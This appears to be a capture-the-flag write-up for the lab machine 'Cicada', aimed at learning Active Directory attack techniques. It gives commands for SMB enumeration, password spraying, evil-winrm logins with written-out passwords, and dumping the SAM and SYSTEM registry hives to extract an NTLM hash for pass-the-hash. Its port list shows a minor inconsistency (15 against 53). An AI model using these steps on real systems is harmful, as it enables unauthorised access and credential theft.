---
title: Cicada Writeup(Easy)
published: true
---

![machine logo](/assets/cicada/logo.png)

# [](#header-2)Recognition

First of all we do a scan with nmap:

```bash
sudo nmap -sS -p- --open --min-rate 5000 10.129.217.34 -n -Pn -oG ports -v
```

The nmap command reported the following ports:
*   Port 15
*   Port 88
*   Port 135
*   Port 139
*   Port 389
*   Port 445
*   Port 593
*   Port 636
*   Port 3268
*   Port 3269
*   Port 5985
*   Port 54115

We do a second, more advanced scan:

```bash
sudo nmap -sCV -p53,88,135,139,389,445,593,636,3268,3269,5985,54115 10.129.217.34 -oN escaneo
```

The scan reports the following information:

![nmap scan](/assets/cicada/nmapScan.png)

Here we can see that the **smb** port is open so we can try to connect using a null session

![smbclient scan](/assets/cicada/smbClientStartScan.png)

Looking in all the directories we find one with interesting information, in the **HR directory** there is a **password** but whe don't know the user

![HR folder content](/assets/cicada/HRContent.png)

To get the file we use this commands:

```bash
smb: \> recurse on
smb: \> mget *
```

![Notice file content](/assets/cicada/noticeContent.png)

Using the following command we find a list of users:

```bash
impacket-lookupsid -no-pass guest@10.129.217.34
```

Now we need to create a file with the users and fuzz them with **crackmapexec**

![Crackmapexec fuzz](/assets/cicada/crackmapexecFuzz.png)

Having the credentials for the user **michael.wrightson** we can list the users with smb

![Crackmapexec list users](/assets/cicada/crackmapexecUsers.png)

In the results we see a comment in the user **david.orelious** with his **password**

Now if we list the shares again we will see a new one with the name **DEV**

![Crackmapexec list shares](/assets/cicada/crackmapexecListShares.png)

With **smbclient** enter in the **DEV** folder

```bash
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.129.217.34/DEV
```

Here we see a file **"Backup_script.ps1"** and openning this we find some **credentials**

![Backup file with credentials](/assets/cicada/backupCred.png)

With crackmapexec we see that we pwned the user

![Crackmapexec winrm](/assets/cicada/crackmapexecWinrm.png)

# [](#header-2)Explotation

Using **evil-winrm** we get a shell

```bash
evil-winrm -i 10.129.217.34 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

Now we can find the **user flag** in the desktop

![User flag](/assets/cicada/userFlag.png)

# [](#header-2)Privilege Escalation

If whe do a **whoami /all** we see the **backups** privilege

![User privileges list](/assets/cicada/privileges.png)

If we search for this privilege we find this [page](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

Following the steps we can get the **root hash**

```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
cd Temp
download sam
download system
```

Now in our system we run the following command:

```bash
pypykatz registry --sam sam system
```

![Administrator hash](/assets/cicada/rootHash.png)

With this we can use the **NTLM Hash** to connect with an **evil-winrm session**

![Winrm session as Administrator](/assets/cicada/adminWinrm.png)

Now we have a **shell** we go to the desktop and get the **root flag**

![Root flag](/assets/cicada/rootFlag.png)
